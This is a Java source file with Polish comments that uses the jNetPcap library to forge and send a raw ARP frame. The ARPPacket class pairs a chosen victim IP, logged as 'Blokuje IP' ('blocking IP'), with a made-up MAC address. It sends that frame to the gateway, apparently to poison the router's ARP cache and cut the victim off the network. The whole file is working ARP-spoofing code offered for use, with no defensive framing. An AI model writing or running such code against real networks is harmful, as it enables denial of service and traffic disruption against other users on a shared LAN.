import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.jnetpcap.Pcap;
import org.jnetpcap.PcapIf;
import org.jnetpcap.packet.JMemoryPacket;
import org.jnetpcap.packet.JPacket;
import org.jnetpcap.protocol.lan.Ethernet;

//klasa tworzaca pakiet
public class ARPPacket {
	private static final String hardwareType = "0001";// 2 bytes
	private static final String protocolType = "0800";// IPv4 protocol
	private static final String hardwareAddressLength = "06";// xx-xx-xx-xx-xx-xx 48 bits => 6bytes
	private static final String protocolAdressLength = "04";// yyy.yyy.yyy.yyy 32 bits => 4 bytes
	private static final String operationCode = "0001";// Arp request 0001 ; Arp reply 0002

	private static final String target_MAC = "192C292D0E3E";	//losowy mac
	private static final String zero_MAC = "000000000000";
	
	private static Network network = null;
	private JPacket ethFrame;
	private Pcap pcap;
	
	private String packetInfo = "";
	
	//zamiana z zapisu z kropkami na szesnastkowy
	private String parseToHex(String IP) {
		String[] temp = IP.split("\\.");
		String hexIP = "";
		String t;
		
		int i;
		for(i=0; i<temp.length; i++) {
			t = Integer.toHexString(Integer.parseInt(temp[i]));
			if (t.length() == 1) t = "0" + t;
			hexIP = hexIP + t;
		}
		return hexIP;
	}

	public ARPPacket(String IP_DESTINATION, Network net) {
		network = net;

		String ip_gateway = parseToHex(net.getGatewayIP());
		String mac_gateway = net.getGatewayMAC();
		String mac_my = net.getMyMAC();
		
		String ip_dest = parseToHex(IP_DESTINATION);
		
		System.out.println("Blokuje IP:  " + IP_DESTINATION);
		System.out.println("Router IP:   " + net.getGatewayIP());
		System.out.println("Router MAC:  " + mac_gateway);
		System.out.println("Moj MAC:     " + mac_my);
		
		String ARPPacket = hardwareType + protocolType + hardwareAddressLength + protocolAdressLength + operationCode + target_MAC + ip_dest + zero_MAC + ip_gateway;
		String ETHPacket = mac_gateway + mac_my + "0806" + ARPPacket;
				
		this.ethFrame = new JMemoryPacket(Ethernet.ID, ETHPacket);
		
		this.packetInfo = "ARP Packet Info: \n" + "ADDR DEST: " + ip_dest + "\nIP GATEWAY: " + ip_gateway + "\nMAC GATEWAY: " + mac_gateway + " " + " " ;
		
		init();
	}

	//sprawdza czy adres bramy i interfejsu sieciowego sa takie same
	private boolean compareAddr(PcapIf device) {
		//pobranie adresu 
		String deviceAddrRough = device.getAddresses().get(0).getAddr().toString();
		String gateAddr = network.getGatewayIP();
		
		//zamiana go na czysty String
		String deviceAddr;	//czysty i przygotowany do porownania adres
	
		String IPADDRESS_PATTERN = "(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)";

		Pattern pattern = Pattern.compile(IPADDRESS_PATTERN);
		Matcher matcher = pattern.matcher(deviceAddrRough);
		
		if (matcher.find()) {
			deviceAddr = matcher.group();
			
			//usuniecie ewentualnych zer
			String[] deviceAddrTab = deviceAddr.split("\\.");			
			int i;
			for(i = 0; i < deviceAddrTab.length; i++) {
				if((deviceAddrTab[i].charAt(deviceAddrTab[i].length() - 1) == '0') && (deviceAddrTab[i].length() > 1)) {
					deviceAddrTab[i] = deviceAddrTab[i].substring(0, deviceAddrTab[i].length() - 1);
					i = i - 1;
				}
			}
			
			deviceAddr = deviceAddrTab[0] + "." + deviceAddrTab[1] + "." + deviceAddrTab[2] + "." + deviceAddrTab[3];
			
			//porownianie
			String[] gateAddrTab = gateAddr.split("\\.");
			if(deviceAddrTab[0].equals(gateAddrTab[0]) && deviceAddrTab[1].equals(gateAddrTab[1]) && deviceAddrTab[2].equals(gateAddrTab[2]) ) return true;		
			} else {
				System.out.println("Nie wy³uskano adresu - b³êdna sk³adnia");
				return false;
			}
		return false;
	}

	public void init() {
		List<PcapIf> alldevs = new ArrayList<PcapIf>(); 	// lista z interfejsami sieciowymi
		StringBuilder errbuf = new StringBuilder(); 		// bledy
		PcapIf device = null;								// wybrany interfejs to wysylania ramek

		// lista urzadzen sieciowych
		Pcap.findAllDevs(alldevs, errbuf);
		
		if ( alldevs.isEmpty()) {
			System.err.printf("Nie mogê znalezæ listy interfejsów sieciowych, b³¹d: %s", errbuf.toString());
			return;
		}		
		
		//wypisuje wszystkie wykryte interfejsy
		System.out.println("\nZnalezione interfejsy sieciowe:");
	    int i = 0;
	    for (PcapIf dev : alldevs) {
	        String description = (dev.getDescription() != null) ? dev.getDescription() : "Brak opisu";
	        System.out.printf("#%d: %s [%s] %s\n", i++, dev.getName(), description, dev.getAddresses().get(0).getAddr());
	        
	        //gdy adres bramy domyslnej i interfejsu jest podobny to wybiera ten interfejs
	        if(compareAddr(dev) && device == null) device = dev;
	    }
	    
	    //otwarcie interfejsu sieciowego
	 	int snaplen = 64 * 1024; // Capture all packets, no trucation
	 	int flags = Pcap.MODE_PROMISCUOUS; // capture all packets
	 	int timeout = 10 * 1000; // 10 seconds in millis
	 	
	 	if(device != null) {
		 	System.out.printf("\nWybrano interfejs '%s' :\n\n", (device.getDescription() != null) ? device.getDescription(): device.getName());
	    	this.pcap = Pcap.openLive(device.getName(), snaplen, flags, timeout, errbuf);
	    	System.out.println(errbuf);
	 	} else {
	 		String deviceS = Pcap.lookupDev(errbuf);	//sam Pcap wybiera interfejs
	 		System.out.println("Program sam wybra³ interfejs = " + deviceS);
			this.pcap = Pcap.openLive(deviceS, snaplen, flags, timeout, errbuf);
	 	}
	}
	
	//wyslanie pakietu ARP
	public void send() {
		if (this.pcap.sendPacket(this.ethFrame) != Pcap.OK) {
			System.err.println(this.pcap.getErr());
		}
	}
	
	//zamkniecie interfejsu
	public void close() {
		this.pcap.close();
	}
	
	public JPacket get() {
		return this.ethFrame;
	}
}